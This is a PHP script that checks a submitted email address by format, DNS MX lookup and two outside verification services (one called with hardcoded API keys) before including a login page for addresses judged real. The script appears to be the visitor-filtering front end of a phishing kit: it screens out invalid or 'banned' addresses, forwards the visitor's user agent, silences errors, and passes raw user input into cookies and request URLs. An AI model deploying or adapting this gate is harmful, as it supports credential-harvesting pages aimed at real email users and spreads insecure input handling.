<?
setcookie('email',$_POST['email'],time()+60*60*24);
error_reporting(0);
class emailvalidator{

    public static function check($email)
    {
        //get the email to check up, clean it
        $email = strtolower(filter_var($email,FILTER_SANITIZE_STRING));

        // 1 - check valid email format using RFC 822
        if (filter_var($email, FILTER_VALIDATE_EMAIL)===FALSE) 
            return '0';
            
        //get email domain to work in nexts checks
        $domain = fetch_value($email,'@','.'); 
        $email_domain = preg_replace('/^[^@]++@/', '', $email);
        $banned_domains = file_get_contents('verification/banned_domains.json');
        $result = strstr ($banned_domains, '"'.$domain) ? 'found' : 'not found';
        // 2 - check if its from banned domains.
/*        if ($result == 'found')
            return 'banned';*/
        // 3 - check DNS for MX records
        if ((bool) checkdnsrr($email_domain, 'MX')==FALSE)
            return '0';

        // 4 - wow actually a real email! congrats ;)
        return '1';
    }

} 

$check = emailvalidator::check($_POST['email']);
///////////////////////////////////////////////////////////////////////

$url = 'https://www.infobyip.com/verifyemailaccount.php';
header('content-typr:text/html; charset-UTF-8');
function curl_http($srv, $usr, $url, $pstf, $pst, $rtf, $flw){
  $ci = curl_init();
  curl_setopt_array($ci, array(
    CURLOPT_SSL_VERIFYPEER => $srv,
    CURLOPT_USERAGENT => $usr,
    CURLOPT_URL => $url,
    CURLOPT_POSTFIELDS => $pstf,
    CURLOPT_POST => $pst,
    CURLOPT_RETURNTRANSFER => $rtf,
    CURLOPT_FOLLOWLOCATION => $flw,
    ));
  return curl_exec($ci);
  curl_close($ci);
}
$fields = array('email' => $_POST['email']); 
foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
rtrim($fields_string, '&');
$usr = $_SERVER['HTTP_USER_AGENT'];
$echo = curl_http(0, $usr, $url, $fields_string, 1, 1, 1);
function fetch_value($str, $find_start, $find_end){
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";}
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}

$mx_server = fetch_value($echo, ' MX server <b>','</b>');
$check_syntax = fetch_value($echo,'Syntax is ','.');
$check_mx = fetch_value($echo,'No MX record ','</b>');
$check_em = fetch_value($echo,' Email account','.');
$check_em .= fetch_value($echo,'email account','.');

if ($mx_server == 'localhost') {
$status = 'banned';
}elseif ($check_syntax == 'valid') {
  if (empty($check_mx)) {
    $status = $check_em;
  }else{
    $status = 'does not exist';
  }
}elseif ($check_syntax == 'invalid'){
  $status = 'does not exist';
}

if (empty($status) || $status == 'exists or not') {
$keys = array('2a06c280.1073.43e1.9bbf.2bac9575b33b','ae27adf4.701b.4e25.91d8.207e8c20ee2d');
$key = $keys[array_rand($keys)];
$Y = @json_decode(file_get_contents("http://api.emailvalidator.co/?AccessKey=".$key."&EmailAddress=".$_POST['email']."&VerificationLevel=3"));
$ok = $Y->IsValid;
}

if ($check == 'banned') {
    setcookie('captcha','true');
    setcookie('error','true');
}elseif (empty($_POST['captcha']) == false && $_POST['captcha'] !== $_COOKIE['code']) {
    setcookie('error','true');
}elseif ($status == 'exists') {
    setcookie("captcha", "", time() - 3600);
    include('includes/login.php');
}elseif ($status == 'does not exist') {
    setcookie('error','true');
}elseif ($status == 'banned') {
    setcookie('captcha','true');
    setcookie('error','true');
}elseif ($ok == '1') {
    setcookie("captcha", "", time() - 3600);
    include('includes/login.php');
}elseif ($ok == '0') {
    setcookie('error','true');
}elseif ($check == '1') {
    setcookie("captcha", "", time() - 3600);
    include('includes/login.php');
}else{
    setcookie('error','true');
}
